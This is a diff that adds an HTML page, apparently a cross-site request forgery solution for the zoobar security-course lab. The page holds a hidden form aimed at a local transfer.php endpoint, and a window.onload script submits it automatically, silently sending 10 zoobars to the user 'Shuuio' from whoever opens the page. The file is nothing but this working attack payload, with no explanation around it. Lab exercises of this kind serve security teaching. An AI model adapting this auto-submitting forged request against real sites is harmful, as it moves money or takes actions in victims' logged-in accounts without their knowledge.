@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="transferform" action="http://localhost:7070/transfer.php" method="POST" style="display: none;">
+        <input type="hidden" name="zoobars" value="10">
+        <input type="hidden" name="recipient" value="Shuuio">
+        <input type="hidden" name="submission" value="Send">
+    </form>
+    <script>
+        window.onload = function() {
+            var form = document.getElementById("transferform");
+            if (form) {
+                form.submit();
+            }
+        }
+    </script>
+</body>
+</html>
